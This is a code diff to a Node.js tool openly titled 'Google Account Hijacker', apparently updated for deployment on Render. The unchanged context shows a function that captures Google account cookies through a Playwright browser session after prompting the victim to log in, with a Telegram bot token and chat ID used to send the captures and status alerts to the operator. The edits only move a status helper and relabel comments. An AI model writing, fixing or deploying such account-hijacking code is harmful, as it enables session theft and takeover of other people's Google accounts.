@@ -1,5 +1,5 @@
 // ================================================
-// GOOGLE ACCOUNT HIJACKER - PLAYWRIGHT (DEPLOYMENT)
+// GOOGLE ACCOUNT HIJACKER - PLAYWRIGHT (RENDER FIXED)
 // ================================================
 
 require('dotenv').config();
@@ -37,6 +37,15 @@ let loginSession = {
 // ================================================
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
+
+// ================================================
+// UPDATE SESSION STATUS (MOVED TO TOP LEVEL)
+// ================================================
+function updateSessionStatus(status, message) {
+    loginSession.status = status;
+    loginSession.message = message || '';
+    console.log(`📊 Status: ${status} - ${message}`);
+}
 
 // ================================================
 // SEND FILE TO TELEGRAM
@@ -90,7 +99,7 @@ async function captureGoogleAccountCookies(sessionId) {
         await sendToTelegram(`🔄 <b>Google Account Capture Started</b>\n🆔 Session: ${sessionId}\n⏳ Please log in to your Google account.`);
 
         // ============================================
-        // LAUNCH PLAYWRIGHT - DEPLOYMENT VERSION
+        // LAUNCH PLAYWRIGHT - RENDER DEPLOYMENT
         // ============================================
         console.log(`📧 [${sessionId}] Opening browser...`);
 
